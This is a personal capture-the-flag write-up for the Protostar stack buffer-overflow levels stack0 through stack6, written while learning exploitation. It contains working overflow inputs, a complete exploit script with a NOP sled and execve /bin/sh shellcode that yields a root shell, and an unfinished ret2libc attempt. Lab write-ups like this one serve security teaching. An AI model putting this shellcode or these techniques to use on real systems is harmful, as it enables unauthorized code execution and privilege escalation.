##Stack0
from disassemble we notice that

```
lea eax, dword [local_1ch]
...
test eax, eax
je 0x8048427
```

so `modified` is stored as `eax` in stack
and we need try to overwrite this `eax`
as the address of `eax` is just after `buffer` in stack
so we just need input a string like `"A" * 64`

##Stack1
just like `stack0` just this time we need change modified to `0x61626364` which is `dcba` 
so the input is `'a'*64+'dcba'`

##Stack2
same as before just need set environment variable `GREENIE` with hex`0x0a0d0a0d`
so `export GREENIE=$'A..(64)\x0a\x0d\x0a\x0d'` this `$` is important here

##Stack3
still easy, we want the `win` function be called, which just need rewrite the `fp`
so use `gdb` to get the address of `win`(or just use r2 haha which I used)
```
> aaaa
> afl
```
then we get the `win` address is `0x08048424`
so just `print -c "print 'A'*64 + '\x24\x84\x04\x08'" | ./stack3`

##Stack4
we need overflow and change the EIP now
using `gdb-peda` we know that overflow to EIP need 76 chars
`python -c "print 'A' * 76 + '\xf4\x83\x04\x08" | ./stack4`

##Stack5
same as stack4, just we need inject shellcode this time
overflow to EIP need 76 chars

ok I tried inject shellcode in buffer and in the modified eip address all didn't work for me
this one is really tricky
then I run it in root mode `username=root, password=godmode` btw I do love this password! and turn on the `core dump`
`ulimit -c unilimited`
`echo "/tmp/core.%t" > /proc/sys/kernal/core_pattern`
in case of that the real stack address while overflow happened might be different
and well this time my code was sorta hmm work, as no error, but also no shell!!!

so I checked the Video from `Liveoverflow` then I get some idea from it(from sploier haha)
* use lots and lots `NOP` to deal with the stack keep changing issue, well I tried to use `ROP` to deal this before, BUT sadly it didn't call `system`!!! Well on the other side finally I understand why `NOP` is so important!
* and run exploit like this `(python exploit.py; cat) | ./stack5`. yes the `cat` is the key, as it is like this, `stack5` expect an input and so we give it `bash` as input then the `pipe` die, and OVER haha, so we need a cat here

OK seems perfect, I shall go now
and YES it works!

ok here is the code
```
exploit.py

import struct

junk = "A" * 76
eip = struct.pack('I', 0xbffff81c + 30)
nopslide = "\x90" * 100
payload = "\x31\xc0\x50\x68\x2f\x2f\x73"
payload += "\x68\x68\x2f\x62\x69\x6e\x89"
payload += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
payload += "\xcd\x80\x31\xc0\x40\xcd\x80"

print junk+eip+nopslide+payload
```

`(python exploit.py ; cat) | /opt/protostar/bin/stack5`
and there is the root shell!

##Stack6

haha took some time to get what's this challenge
so if I change the `ret` address to somewhere in stack(`0xbf000000`) it will exit.
thus I need to overflow it somewhere else such as `'/bin/sh'` in system
that's why the hint mentioned ret2libc

```
>(gdb) print system
0xb7ecffb0 <__libc_system>
>(gdb) print __libc_start_main
0xb7eadb90 <__libc_start_main>
>(gdb) find 0xb7eadb90, +2200000, "/bin/sh"
0xb7fba23f
```
but I used these information as payload (junk + systemsaddr + 0xdeadbeef + binaddr) and get `Segmentation fault`
then I find out this `/bin/sh` address is just FAKE, well using `x/s` on it it is not at bash all

so I am thinking, I should write a `/bin/sh` in somewhere like `.bss`

`readelf -S stack6`
I think we can write in `.bss` `.data` `.text` there are more space in `.text`


```
0x8048577 : pop edi ; pop ebp; ret
```
geez no good `mov;ret`
oh also tricky, keep tomorrow

